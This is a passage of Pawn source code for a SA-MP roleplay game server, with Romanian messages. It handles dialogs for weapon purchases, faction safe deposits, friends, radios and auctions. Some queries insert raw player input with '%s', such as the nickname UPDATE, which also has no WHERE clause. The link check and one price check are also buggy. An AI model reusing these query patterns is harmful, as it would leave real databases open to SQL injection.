					SendClientMessage(playerid, COLOR_YELLOW, string);
					mysql_format(SQL, gQuery, 128, "UPDATE `stuff` SET `nickname` = '%s'", inputtext);
					mysql_tquery(SQL, gQuery);
				}
				case 5: {
					for(new i = 1; i < sql_houses; i++) {
						if(strcmp(HouseInfo[i][hOwner], "The State", true) == 0) continue;
						mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", HouseInfo[i][hOwner]);
						mysql_tquery(SQL, gQuery, "sql_sell_house_inactive", "ii", playerid, i);
					}
					SendClientMessage(playerid, COLOR_WHITE, "Casele au fost scoase la vanzare.");
				}
				case 6: {
					for(new i = 1; i < bussines; i++) {
						if(strcmp(BizzInfo[i][bOwner], "The State", true) == 0) continue;
						mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", BizzInfo[i][bOwner]);
						mysql_tquery(SQL, gQuery, "sql_remove_bizz_inactive", "ii", playerid, i);
					}
					SendClientMessage(playerid, COLOR_WHITE, "Bizz-urile au fost scoase la vanzare.");
				}
				case 7: {
					SendClientMessage(playerid, COLOR_YELLOW, "Quest-ul a fost resetat!");
					ResetQuest();
				}
			}
		}
		case DIALOG_BUYGUN: {
			if(!response) return true;
			if InInterior[playerid] != BUSINESS_INTERIOR *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un bussiness!");

			switch(listitem) {
				case 0: {
					if(GetPlayerCash(playerid) < 2000) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $2,000 pentru a cumpara aceasta arma!");
					ServerWeapon(playerid, 24, 50);
					SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat arma Deagle pentru suma de $2,000.");
					GivePlayerCash(playerid, -2000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 2000;
				}
				case 1: {
					if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $5,000 pentru a cumpara aceasta arma!");
					ServerWeapon(playerid, 31, 200);
					SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat arma M4 pentru suma de $5,000.");
					GivePlayerCash(playerid, -5000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 5000;
				}
				case 2: {
					if(GetPlayerCash(playerid) < 4800) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $4,800 pentru a cumpara aceasta arma!");
					ServerWeapon(playerid, 30, 200);
					SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat arma AK47 pentru suma de $4,800.");
					GivePlayerCash(playerid, -4800);
					BizzInfo[InInteriorID[playerid]][bBalance] += 4800;
				}	
				case 3: {
					if(GetPlayerCash(playerid) < 2500) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $2,500 pentru a cumpara aceasta arma!");
					ServerWeapon(playerid, 28, 200);
					SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat arma Micro SMG pentru suma de $2,500.");
					GivePlayerCash(playerid, -2500);
					BizzInfo[InInteriorID[playerid]][bBalance] += 2500;
				}	
				case 4: {
					if(GetPlayerCash(playerid) < 3000) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $3,000 pentru a cumpara aceasta arma!");
					ServerWeapon(playerid, 25, 20);
					SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat arma Shotgun pentru suma de $3,000.");
					GivePlayerCash(playerid, -3000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 3000;
				}		
				case 5: {
					if(GetPlayerCash(playerid) < 3000) return SendClientMessage(playerid, COLOR_GREY, "Ai nevoie de $3,000 pentru a cumpara aceasta arma!");
					ServerWeapon(playerid, 5, 1);
					SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat o bata pentru suma de $1,000.");
					GivePlayerCash(playerid, -1000);
					BizzInfo[InInteriorID[playerid]][bBalance] += 1000;
				}
			}
		}
		case DIALOG_FDEPOSIT: {
			if(!response) return true;
			switch(listitem) {
				case 0: {
					ShowPlayerDialog(playerid, DIALOG_FDEPOSIT1, DIALOG_STYLE_INPUT, "Deposit", "Scrie suma de bani pe care vrei sa o depozitezi putin mai jos!", "Select", "Inapoi");
				}
				case 1: {
					ShowPlayerDialog(playerid, DIALOG_FDEPOSIT1, DIALOG_STYLE_INPUT, "Deposit", "Scrie suma de materiale pe care vrei sa o depozitezi putin mai jos!", "Select", "Inapoi");
				}
				case 2: {
					ShowPlayerDialog(playerid, DIALOG_FDEPOSIT1, DIALOG_STYLE_INPUT, "Deposit", "Scrie suma de droguri pe care vrei sa o depozitezi putin mai jos!", "Select", "Inapoi");
				}
			}
			SelectedItem[playerid] = listitem;
		}
		case DIALOG_FDEPOSIT1: {
			if(!response) {
				ShowPlayerDialog(playerid, DIALOG_FDEPOSIT, DIALOG_STYLE_LIST, "Faction deposit", "Money\nMaterials\nDrugs", "Ok", "Exit");
				return true;
			}
			switch(SelectedItem[playerid]) {
				case 0: {
					if(GetPlayerCash(playerid) < strval(inputtext) || strval(inputtext) <= 0) return SendClientMessage(playerid, COLOR_WHITE, "* Suma invalida!");
					SafeInfo[SeifID[playerid]][sMoney] += strval(inputtext);
					GivePlayerCash(playerid, -strval(inputtext));
					format(string, sizeof(string), "* %s a depozitat $%s in seiful factiunii.", GetName(playerid), FormatNumber(strval(inputtext)));
					SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, string);	
				}
				case 1: {
					if(PlayerInfo[playerid][pMats] < strval(inputtext) || strval(inputtext) <= 0) return SendClientMessage(playerid, COLOR_WHITE, "* Suma invalida!");
					SafeInfo[SeifID[playerid]][sMaterials] += strval(inputtext);
					PlayerInfo[playerid][pMats] -= strval(inputtext);
					format(string, sizeof(string), "* %s a depozitat %s materiale in seiful factiunii.", GetName(playerid), FormatNumber(strval(inputtext)));
					SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, string);	
					UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
					if(IsMafie(playerid)) AddFactionRaport(playerid, 0, strval(inputtext));
				}
				case 2: {
					if(PlayerInfo[playerid][pDrugs] < strval(inputtext) || strval(inputtext) <= 0) return SendClientMessage(playerid, COLOR_WHITE, "* Suma invalida!");
					SafeInfo[SeifID[playerid]][sDrugs] += strval(inputtext);
					PlayerInfo[playerid][pDrugs] -= strval(inputtext);
					UpdateVar(playerid, "Drugs", PlayerInfo[playerid][pDrugs]);
					format(string, sizeof(string), "* %s a depozitat %s droguri in seiful factiunii.", GetName(playerid), FormatNumber(strval(inputtext)));
					SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, string);		
					if(IsMafie(playerid)) AddFactionRaport(playerid, 1, strval(inputtext));
				}			
			}
			SaveSeif(SeifID[playerid]);	
		}		
		case DIALOG_FWITHDRAW: {
			if(!response) return true;
			switch(listitem) {
				case 0: {
					format(string, sizeof(string), "Seiful factiunii are in total: $%s.\nScrie suma pe care vrei sa o scoti putin mai jos!", FormatNumber(SafeInfo[SeifID[playerid]][sMoney]));
					ShowPlayerDialog(playerid, DIALOG_FWITHDRAW1, DIALOG_STYLE_INPUT, "Withdraw", string, "Select", "Inapoi");
				}
				case 1: {
					format(string, sizeof(string), "Seiful factiunii are in total: %s materiale.\nScrie suma pe care vrei sa o scoti putin mai jos!", FormatNumber(SafeInfo[SeifID[playerid]][sMaterials]));
					ShowPlayerDialog(playerid, DIALOG_FWITHDRAW1, DIALOG_STYLE_INPUT, "Withdraw", string, "Select", "Inapoi");
				}
				case 2: {
					format(string, sizeof(string), "Seiful factiunii are in total: %s droguri.\nScrie suma pe care vrei sa o scoti putin mai jos!", FormatNumber(SafeInfo[SeifID[playerid]][sDrugs]));
					ShowPlayerDialog(playerid, DIALOG_FWITHDRAW1, DIALOG_STYLE_INPUT, "Withdraw", string, "Select", "Inapoi");
				}
			}
			SelectedItem[playerid] = listitem;
		}
		case DIALOG_FWITHDRAW1: {
			if(!response) {
				new s = SeifID[playerid];
				format(string, sizeof(string), "Option\tResult\nMoney\t$%s\nMaterials\t%s\nDrugs\t%s\n", FormatNumber(SafeInfo[s][sMoney]), FormatNumber(SafeInfo[s][sMaterials]), FormatNumber(SafeInfo[s][sDrugs]));
				ShowPlayerDialog(playerid, DIALOG_FWITHDRAW, DIALOG_STYLE_TABLIST_HEADERS, "Faction withdraw", string, "Ok", "Exit");
				return true;
			}
			switch(SelectedItem[playerid]) {
				case 0: {
					if(SafeInfo[SeifID[playerid]][sMoney] < strval(inputtext) || strval(inputtext) <= 0) return SendClientMessage(playerid, COLOR_WHITE, "* Suma invalida!");
					SafeInfo[SeifID[playerid]][sMoney] -= strval(inputtext);
					GivePlayerCash(playerid, strval(inputtext));
					format(string, sizeof(string), "Ai luat din seiful factiunii $%s! Acum in seif mai sunt $%s.", FormatNumber(strval(inputtext)), FormatNumber(SafeInfo[SeifID[playerid]][sMoney]));
					SendClientMessage(playerid, COLOR_MONEY, string);
				}
				case 1: {
					if(SafeInfo[SeifID[playerid]][sMaterials] < strval(inputtext) || strval(inputtext) <= 0) return SendClientMessage(playerid, COLOR_WHITE, "* Suma invalida!");
					SafeInfo[SeifID[playerid]][sMaterials] -= strval(inputtext);
					PlayerInfo[playerid][pMats] += strval(inputtext);
					format(string, sizeof(string), "Ai luat din seiful factiunii %s materiale! Acum in seif mai sunt %s materiale.", FormatNumber(strval(inputtext)), FormatNumber(SafeInfo[SeifID[playerid]][sMaterials]));
					SendClientMessage(playerid, COLOR_MONEY, string);
				}
				case 2: {
					if(SafeInfo[SeifID[playerid]][sDrugs] < strval(inputtext) || strval(inputtext) <= 0) return SendClientMessage(playerid, COLOR_WHITE, "* Suma invalida!");
					SafeInfo[SeifID[playerid]][sDrugs] -= strval(inputtext);
					PlayerInfo[playerid][pDrugs] += strval(inputtext);
					format(string, sizeof(string), "Ai luat din seiful factiunii $%s droguri! Acum in seif mai %s droguri.", FormatNumber(strval(inputtext)), FormatNumber(SafeInfo[SeifID[playerid]][sDrugs]));
					SendClientMessage(playerid, COLOR_MONEY, string);
				}
			}
			SaveSeif(SeifID[playerid]);	
		}	
		case DIALOG_QUITCLAN: {
			if(!response) return true;
			ClanMembers[PlayerInfo[playerid][pClan]] --;
			Iter_Remove(clan_players<PlayerInfo[playerid][pClan]>, playerid);
			PlayerInfo[playerid][pClan] = 0;
			PlayerInfo[playerid][pClanRank] = 0;
			PlayerInfo[playerid][pClanDays] = 0;
			PlayerInfo[playerid][pClanWarn] = 0;
			SetPlayerName(playerid, PlayerInfo[playerid][pUsername]);
			mysql_format(SQL, query, sizeof(query), "UPDATE `users` SET `Clan`='%d', `ClanRank`='%d', `ClanDays`='0', `ClanWarns`='0' WHERE `Name`='%s'", PlayerInfo[playerid][pClan], PlayerInfo[playerid][pClanRank], PlayerInfo[playerid][pUsername]);
			mysql_tquery(SQL, query, "", "");
			SendClientMessage(playerid, COLOR_YELLOW, "* Ai iesit din clan.");
		}		
		case DIALOG_FRIENDS: {
			if(!response) return true;
			if(!listitem) return ShowPlayerDialog(playerid, DIALOG_FRIENDS1, DIALOG_STYLE_INPUT, "Add new friend", "Scrie mai jos ID-ul sau numele jucatorului pe care vrei sa-l adaugi.\nAcela trebuie sa fie online pentru a-l putea adauga.", "Add", "Cancel");
			listitemmm[playerid] = listitem-1;
			format(gString, 128, "Friend: %s %s", Selected[playerid][listitem-1], SelectedPlayers[playerid][listitem-1]==-1?("{FF5C5C}[offline]"):("{98FF5C}[online]"));
			ShowPlayerDialog(playerid, DIALOG_FRIENDS2, DIALOG_STYLE_LIST, gString, SelectedPlayers[playerid][listitem-1]==-1?"{FF0000}Remove Friend":"Call\nSMS\n{FF0000}Remove Friend", "Select", "Back");
		}
		case DIALOG_FRIENDS1: {
			if(!response) return true;
			new id;
			if(sscanf(inputtext, "u", id)) return SendClientMessage(playerid, COLOR_LGREEN, "Acel player nu este online!");

			if(!IsPlayerConnected(id)) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Acel player nu este online!");

			if(!IsPlayerLogged(id))
				return SendClientMessage(playerid, COLOR_LGREEN, "Acel player nu este logat!");

            if(id == playerid) 
            	return SendClientMessage(playerid, COLOR_LGREEN, "Nu te poti adauga pe tine in lista!");

			if(!togFriend[id]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player are cererile de prietenie oprite.");

			SCMf(playerid, COLOR_GOLD, "Cererea de prietenie i-a fost trimisa lui %s (%d).", GetName(id), id);
			SCMf(id, COLOR_GOLD, "%s ti-a trimis o cerere de prietenie, pentru a-i accepta cererea, foloseste (/accept friend %d).", GetName(playerid), playerid);
			cerereFriends[id] = playerid;
		}
		case DIALOG_FRIENDS2: {
			if(!response) return ShowPlayerFriends(playerid);
			new userid = SelectedPlayers[playerid][listitemmm[playerid]];
			if(userid==-1) listitem=2;
			if(!IsPlayerConnected(userid)&&listitem!=2) return true;
			switch(listitem) {
				case 0: {
					if(!HavePhone(playerid)) 
						return SendClientMessage(playerid, -1, "Nu ai a cellphone!");

					if(PaintType[playerid] != 0) 
						return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda in arena de paintball!");

					if(PhoneOnline[playerid]) 
						return SendClientMessage(playerid, -1, "Telefonul tau este inchis.");

					if(Mobile[playerid] != -1) 
						return SendClientMessage(playerid, -1, "Esti deja intr-un apel.");

					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `PhoneNr` = '%s' AND `Status` != '-1' LIMIT 1", PlayerInfo[userid][pPhone]);
					mysql_tquery(SQL, gQuery, "sql_check_phone", "is", playerid, PlayerInfo[userid][pPhone]);
				}
				case 1: {
					if(!HavePhone(playerid)) 
						return SendClientMessage(playerid, -1, "Nu ai a cellphone!");

					ShowPlayerDialog(playerid, DIALOG_FRIENDS4, DIALOG_STYLE_INPUT, "SMS:", "Scrie mai jos mesajul pe care vrei sa-l trimiti.", "Ok", "Exit");
				}
				case 2: {
					mysql_format(SQL, gQuery, 180, "DELETE FROM `friends` WHERE `ID` = '%i'", Blocked[playerid][listitemmm[playerid]]);
					mysql_tquery(SQL, gQuery);
					SCMf(playerid, COLOR_GOLD, "%s nu mai face parte din lista ta de prieteni.", Selected[playerid][listitemmm[playerid]]);
				}
			}
		}
		case DIALOG_FRIENDS3: {
			if(!response) return ShowPlayerFriends(playerid);
			mysql_format(SQL, string,128,"DELETE FROM `friends` WHERE `friendName`='%s' AND `AddBy`='%d'",sName[playerid], PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, string, "", "");
			format(string, sizeof(string), "%s nu mai face parte din lista ta de prieteni.", sName[playerid]);
			SendClientMessage(playerid, COLOR_GOLD, string);
		}
		case DIALOG_FRIENDS4: {
			if(!response) return true;
			new giveplayerid = SelectedPlayers[playerid][listitemmm[playerid]];
			if(!IsPlayerConnected(giveplayerid)) 
				return true;

			if(PhoneOnline[giveplayerid]) 
				return SendClientMessage(playerid, -1, "Telefonul lui este inchis.");

			SCMf(giveplayerid, COLOR_YELLOW, "SMS from %s ({FFFFFF}%s{FFFF00}): %s",GetName(playerid), PlayerInfo[playerid][pPhone], inputtext);
			SCMf(playerid, 0xC8E0DFFF, "SMS send to %s ({FFFFFF}%s{C8E0DF}): %s", GetName(giveplayerid), PlayerInfo[giveplayerid][pPhone], inputtext);
			ChatLog(playerid, "(sms) %s catre %s: %s", GetName(playerid), GetName(giveplayerid), inputtext);	
			PlayerPlaySound(giveplayerid, 1138, 0.0, 0.0, 0.0);
			Reply[giveplayerid] = playerid;
		}		
		case DIALOG_FACTIONS: {
			if(!response) return true;
			new i = listitem+1; SelectedFaction[playerid] = i;
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Member` = '%i' AND `Rank` = '7' LIMIT 1", i);
			mysql_tquery(SQL, gQuery, "sql_check_faction_leader", "ii", playerid, i);
		}
		case DIALOG_FACTIONS1: {
			if(!response) return true;
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			new i = SelectedFaction[playerid];
			SetPlayerCheckpoint(playerid,DynamicFactions[i][extX], DynamicFactions[i][extY], DynamicFactions[i][extZ],4.0);
			SendClientMessage(playerid,COLOR_YELLOW, "Server-ul ti-a pus un punct rosu la locatia aleasa de tine.");
			CP[playerid] = 43;			
		}
		case DIALOG_HRADIO: {
			if(!response) return true;
			if PlayerInfo[playerid][pHouse]!=InInteriorID[playerid]||InInterior[playerid]!=HOUSE_INTERIOR *then
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa fi in casa pentru a schimba radio-ul.");
			
			new i = listitem;
			HouseInfo[PlayerInfo[playerid][pHouse]][hRadio] = i;
			mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Radio`='%d' WHERE `ID`='%d'", i, PlayerInfo[playerid][pHouse]);
			mysql_tquery(SQL, query, "", "");
			SendClientMessage(playerid, COLOR_YELLOW, "Modificari actualizate!");
			if(i == 0) {
				foreach(new x : StreamedPlayer[playerid]) {
					StopAudioStreamForPlayer(x);
					Iter_Remove(RadioCount<PlayRadio[x]>, x);
					PlayRadio[x] = 0;
				}
				return true;
			}	
			foreach(new x : StreamedPlayer[playerid]) {
				PlayAudioStreamForPlayer(x, RadioLink[HouseInfo[PlayerInfo[playerid][pHouse]][hRadio]]);
				PlayRadio[x] = i;
				Iter_Add(RadioCount<i>, x);
			}
		}
		case DIALOG_BRADIO: {
			if(!response) return true;
			if(PlayerInfo[playerid][pBizz]!=InInteriorID[playerid] || InInterior[playerid] != BUSINESS_INTERIOR)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eraore: Trebuie sa fi in business pentru a schimba radio-ul.");

			new i = listitem;
			BizzInfo[PlayerInfo[playerid][pBizz]][bRadio] = i;
			mysql_format(SQL,query, sizeof(query), "UPDATE `bizz` SET `Radio`='%d' WHERE `ID`='%d'", i, PlayerInfo[playerid][pBizz]);
			mysql_tquery(SQL, query, "", "");
			SendClientMessage(playerid, COLOR_YELLOW, "Modificari actualizate!");
			if(i == 0) {
				foreach(new x : StreamedPlayer[playerid]) {
					StopAudioStreamForPlayer(x);
					Iter_Remove(RadioCount<PlayRadio[x]>, x);
					PlayRadio[x] = 0;
				}
				return true;
			}	
			foreach(new x : StreamedPlayer[playerid]) {
				if(InInteriorID[x] == PlayerInfo[playerid][pBizz] && InInterior[x] == BUSINESS_INTERIOR) {
					PlayAudioStreamForPlayer(x, RadioLink[BizzInfo[PlayerInfo[playerid][pBizz]][bRadio]]);
					PlayRadio[x] = i;
					Iter_Add(RadioCount<i>, x);
				}
			}
		}	
		case DIALOG_PCOLOR: {
			if(!response) 
				return true;		

			PlayerInfo[playerid][pColor] = listitem;
			UpdateVar(playerid, "Color", listitem);
			if(listitem == 0) return SendClientMessage(playerid, -1, "Ai scos culoarea!");
			format(gString, 75, "(Premium Colors) Culoarea aleasa de tine este {%s}aceasta{FFADAD}.", PlayerColors(playerid));
			SendClientMessage(playerid, 0xFFADADFF, gString);
		}	
		case DIALOG_VOTE: {
			if(!response) return true;
			MapVotes[PaintType[playerid]-1][listitem] ++; Voted[playerid] = 1;
			SendPaintMessage(PaintType[playerid], COLOR_CLIENT, "[VOTE] %s voted for map %s.", GetName(playerid), MapName2(listitem));
		}			
		case DIALOG_CARRADIO: {
			if(!response) return 1;
			new i = listitem;
			if(i == 0) {
				foreach(new x: VehOccupeid<GetPlayerVehicleID(playerid)>) Iter_Remove(RadioCount<PlayRadio[x]>, x);
				StopAudioStreamForPlayersInCar(GetPlayerVehicleID(playerid)), CarRadio[GetPlayerVehicleID(playerid)] = 0;	
				return true;	
			}
			foreach(new x: VehOccupeid<GetPlayerVehicleID(playerid)>) {
				if(Iter_Contains(RadioCount<PlayRadio[x]>, x)) Iter_Remove(RadioCount<PlayRadio[x]>, x);
				PlayRadio[x] = i;
				Iter_Add(RadioCount<i>, x);
			}			
			if(i == sizeof(RadioLink)) {
				ShowPlayerDialog(playerid, DIALOG_CARRADIO2, DIALOG_STYLE_INPUT, "Youtube custom URL", "Scrie mai jos link-ul de la videoclipul de pe YouTube:", "Ok", "Exit");
			}
			else {							
				PlayAudioStreamForPlayersInCar(GetPlayerVehicleID(playerid), RadioLink[i]);
				NearMessage(playerid, COLOR_PURPLE, "* %s asculta acum %s.", GetName(playerid), RadioNames[i]);	
				CarRadio[GetPlayerVehicleID(playerid)] = i;
			}	
		}		
		case DIALOG_CARRADIO2: {
			if(!response) return true;
			if(!IsPlayerInAnyVehicle(playerid)) return true;
			if(strfind(inputtext, "xnxx", true) != -1) { }
			else return SendClientMessage(playerid, COLOR_GREY, "Invalid link!");			
			new k = sizeof(RadioLink);	
			format(string, sizeof(string), "%s", inputtext);
			foreach(new x: VehOccupeid<GetPlayerVehicleID(playerid)>) {	
				PlayRadio[x] = k; 
				PlayAudioStreamForPlayer(x, string);
				Iter_Add(RadioCount<k>, x);
			}			
			CarRadio[GetPlayerVehicleID(playerid)] = k;
			format(CarLink[GetPlayerVehicleID(playerid)], 256, string);
		}
		case DIALOG_BID: {
			if(!response) return true;
			if(!TipLicitatie) 
				return SendClientMessage(playerid, -1, "Nu este o licitatie activa!");

			new suma = listitemmm[playerid];
			if(TipLicitatie==0||TipLicitatie==1||TipLicitatie==2||TipLicitatie==3||TipLicitatie==5) {
				format(srsString, sizeof srsString, "%d000000", suma);
				if OPByte(bank[playerid], <, srsString) *then
					return SendClientMessage(playerid, -1, "Nu ai destui bani!");
	
				if(suma<bid_money+1)
					return SCMf(playerid, -1, "Suma invalida! Poti licita minim $%s.000.000.", FormatNumber(bid_money+1));
	
				bid_money=suma;
				TimpLicitatie=60;
				strmid(_bid_name, PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
				LastPlayer = PlayerInfo[playerid][pSQLID];
				if(toglicitatie[playerid] == 0) {
					toglicitatie[playerid] = 1;
					SendClientMessage(playerid, COLOR_YELLOW, "Server-ul ti-a activat automat optiunea de a vedea mesajele de la licitatie.");
					UpdateVar(playerid, "TogLicitatie", 1);
				}
				format(gString, 128, "> [BID] %s a licitat suma de $%s.000.000.", GetName(playerid), FormatNumber(bid_money));
				MesajLicitatie(0xAA71B7FF, gString);			
			}
			else if(TipLicitatie==4) {
				if(PlayerInfo[playerid][pPremiumPoints] < suma)
					return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma de premium points.");

				if(suma<bid_money+1)
					return SCMf(playerid, -1, "Suma invalida! Poti licita minim $%sPP.", FormatNumber(bid_money+1));

				bid_money=suma;
				TimpLicitatie=60;
				strmid(_bid_name, PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
				LastPlayer = PlayerInfo[playerid][pSQLID];
				if(toglicitatie[playerid] == 0) {
					toglicitatie[playerid] = 1;
					SendClientMessage(playerid, COLOR_YELLOW, "Server-ul ti-a activat automat optiunea de a vedea mesajele de la licitatie.");
					UpdateVar(playerid, "TogLicitatie", 1);
				}
				format(gString, 128, "> [BID] %s a licitat suma de %sPP.", GetName(playerid), FormatNumber(bid_money));
				MesajLicitatie(0xAA71B7FF, gString);
			}
		}	
		case DIALOG_QUITFACTION: {
			if(!response) return true;
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Leader`='%d'", PlayerInfo[playerid][pMember]);
			mysql_tquery(SQL, gQuery, "sql_cache_leader", "i", playerid);
		}			
		case DIALOG_MODE: {
			if(!response) return true;
			PaintType[playerid] = listitem+1;
			PlayerInfo[playerid][pChatCMD] = 12;
			PlayerTextDrawHide(playerid, ChatCMD);
			Iter_Add(InPaint<listitem>, playerid);
			PKills[playerid] = 0, PDeaths[playerid] = 0;
			SendPaintMessage(listitem+1, COLOR_LIGHTGOLD, "%s has joined the paintball arena.", GetName(playerid));
			ResetPlayerWeapons(playerid);
			PaintSpawn(playerid);
			lastKill[playerid] =  0;
			BizzInfo[BizzTypeID[14][0]][bBalance] += 10000;
			GivePlayerCash(playerid, -10000);
			if(PlayersOnPaint(listitem) == 2) {	
				PaintTime[listitem] = -1;
				PaintText[listitem] = 30;
				PaintVote[listitem] = 1;	
			}
		}
	    case DIALOG_CHECKPOINT: {
	        if(!response) return true;
			if(InExamen[playerid]) 
				FailExamen(playerid);

			if p_rob[playerid][r_coPlayer]!=-1 *then return stop_rob(playerid, 4);
			DisablePlayerRaceCheckpointEx(playerid);
			targetfind[playerid] = -1;
			CP[playerid] = 0;
			UsedFind[playerid] = 0;		
		
			DisablePlayerCheckpointEx(playerid);
			SendClientMessage(playerid,COLOR_WHITE,"Punctul rosu a fost sters cu succes.");
			PlayerTextDrawHide(playerid, FindTD);
			PlayerTextDrawHide(playerid, FindSkinTD);
			DisablePlayerCheckpointEx(playerid);	
			if(JobWorking[playerid] == 1) stopWork(playerid);
		}
		case DIALOG_TOG: {
			if(!response) return true;
			switch(listitem) {
			    case 0: {
					if(PlayerInfo[playerid][pLeader] == 0 && PlayerInfo[playerid][pAdmin]==0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti lider!");
			        toglc[playerid]=!toglc[playerid];
					UpdateVar(playerid, "TogLC", toglc[playerid]);
			    }
			    case 1: {
					if(PlayerInfo[playerid][pMember] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti membru al unei factiuni!");
			        gFam[playerid]=!gFam[playerid];
					UpdateVar(playerid, "TogFC", gFam[playerid]);
			    }
			    case 2: {
			        WTToggle[playerid]=!WTToggle[playerid];
					UpdateVar(playerid, "TogWT", WTToggle[playerid]);
			    }
			    case 3: {
			        HidePM[playerid]=!HidePM[playerid];
					UpdateVar(playerid, "HidePM", HidePM[playerid]);
			    }
			    case 4: gOoc[playerid]=!gOoc[playerid];
			    case 5: {
			        gNews[playerid]=!gNews[playerid];
					UpdateVar(playerid, "TogNews", gNews[playerid]);
			    }
				case 6: {
			        if(toglicitatie[playerid] == 0) toglicitatie[playerid] = 1, SendClientMessage(playerid, COLOR_YELLOW, "Pentru a vedea informatii despre licitatie, foloseste /info.");
			        else toglicitatie[playerid] = 0;	
					UpdateVar(playerid, "TogLicitatie", toglicitatie[playerid]);		
				}
				case 7: togclan[playerid]=!togclan[playerid], UpdateVar(playerid, "TogClan", togclan[playerid]);			
				case 8: togevent[playerid] = !togevent[playerid], UpdateVar(playerid, "TogEvent", togevent[playerid]);	
				case 9: togding[playerid] = !togding[playerid], UpdateVar(playerid, "TogDing", togding[playerid]);		
				case 10: togfind[playerid] = !togfind[playerid],UpdateVar(playerid, "TogFind", togfind[playerid]);		
				case 11: tograport[playerid] = !tograport[playerid], UpdateVar(playerid, "TogRaport", tograport[playerid]);					
				case 12: togjob[playerid] = !togjob[playerid], UpdateVar(playerid, "TogJob", togjob[playerid]);						
				case 13: {
					togTransfer[playerid]=!togTransfer[playerid];
					UpdateVar(playerid, "TogTransfer", togTransfer[playerid]);
				}		
				case 14: {
					togFriend[playerid]=!togFriend[playerid];
					UpdateVar(playerid, "TogFriend", togFriend[playerid]);
				}
				case 15: {
			        togpremium[playerid] = !togpremium[playerid];
					UpdateVar(playerid, "TogPremium", togpremium[playerid]);
				}
				case 16: togLancher[playerid]=!togLancher[playerid];
				case 17: togStage[playerid]=!togStage[playerid];
				case 18: {
					togJobGoal[playerid] = !togJobGoal[playerid];
					UpdateVar(playerid, "TogJobGoal", togJobGoal[playerid]);
				}
				case 19: {
					togsurf[playerid] = !togsurf[playerid];
					UpdateVar(playerid, "TogSurf", togsurf[playerid]);
				}
				case 20: {
					togLegend[playerid] = !togLegend[playerid];
					UpdateVar(playerid, "TogLegend", togLegend[playerid]);
				}
				case 21: {
					togCrate[playerid] = !togCrate[playerid];
					UpdateVar(playerid, "TogCrate", togCrate[playerid]);
				}
				case 22: {
					togvip[playerid] = !togvip[playerid];
					UpdateVar(playerid, "TogVip", togvip[playerid]);
				} 
				case 23: { 
					togHeadText[playerid]=!togHeadText[playerid];
					SCMf(playerid, -1, "Player Head Text: %s", togHeadText[playerid]?"{128C14}Enable":"{D60F0F}Disable");
					UpdateVar(playerid, "TogHeadText", togHeadText[playerid]);
					if(!togHeadText[playerid]) hide_head_label(playerid);
					else update_head_label(playerid);
				}
				case 24: {
					togReborn[playerid] = !togReborn[playerid];
					UpdateVar(playerid, "TogReborn", togReborn[playerid]);
				}
			}
			SendClientMessage(playerid, 0xFFADADFF, "Updated changes!");
		}
		case DIALOG_TOGRAINBOW: {
			new speed = strval(inputtext);
			if(speed > 3) return SendClientMessage(playerid, COLOR_GREY, "Invalid.");
			format(string, sizeof(string), "Rainbow speed is now %d.", strval(inputtext));
			SendClientMessage(playerid, COLOR_YELLOW, string);
			tograinbow[playerid] = speed;
			UpdateVar(playerid, "TogRainBow", speed);
		}		
		case DIALOG_RESETKM: {
			if(!response) return true;
			new idd = listitemm[playerid];
			if(!CarInfo[idd][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul nu este spawnat!");
			PlayerInfo[playerid][pPremiumPoints] -= 200;
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			CarInfo[idd][KM] = 0.0;
			mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `KM`='0' WHERE `ID`='%d'", CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery);
			SCMf(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai resetat cu succes kilometrii la vehiculul %s[id: %d].", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID]);
		}
		case DIALOG_RESETDAYS: {
			if(!response) return true;
			new idd = listitemm[playerid];
